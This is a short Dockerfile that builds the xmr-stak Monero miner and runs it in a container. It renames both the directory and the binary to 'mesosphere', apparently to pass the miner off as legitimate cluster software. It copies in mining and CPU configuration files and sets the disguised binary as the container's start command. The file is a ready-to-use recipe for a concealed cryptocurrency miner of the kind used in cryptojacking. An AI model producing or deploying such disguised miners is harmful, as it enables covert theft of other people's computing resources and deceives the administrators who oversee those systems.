FROM ubuntu:16.04
RUN apt-get update && apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git vim htop
RUN git clone https://github.com/fireice-uk/xmr-stak.git
RUN cd xmr-stak/ && cmake . -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF && make install 
# && cd bin/ && sysctl -w vm.nr_hugepages=128
RUN mv xmr-stak mesosphere && mv /mesosphere/bin/xmr-stak /mesosphere/bin/mesosphere
COPY c/xmr/config.txt /mesosphere/bin/config.txt
COPY c/xmr/cpu.txt /mesosphere/bin/cpu.txt
CMD ["/mesosphere/bin/mesosphere"]
